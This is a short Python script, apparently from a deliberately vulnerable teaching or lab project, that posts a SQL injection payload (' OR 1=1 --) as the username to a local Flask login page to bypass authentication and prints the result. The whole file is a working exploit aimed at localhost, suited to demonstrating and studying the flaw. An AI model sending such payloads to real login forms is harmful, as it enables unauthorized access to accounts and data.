import requests

"""
This script demonstrates a basic SQL injection attack against the vulnerable
Flask application in this project. It sends a specially crafted username
payload that bypasses authentication by exploiting unsanitised SQL queries.
"""

TARGET_URL = "http://localhost:5000/"

def exploit():
    # SQL injection payload: always evaluates to true
    payload = "' OR 1=1 --"
    data = {"username": payload, "password": "irrelevant"}
    resp = requests.post(TARGET_URL, data=data)
    print(resp.text)


if __name__ == "__main__":
    exploit()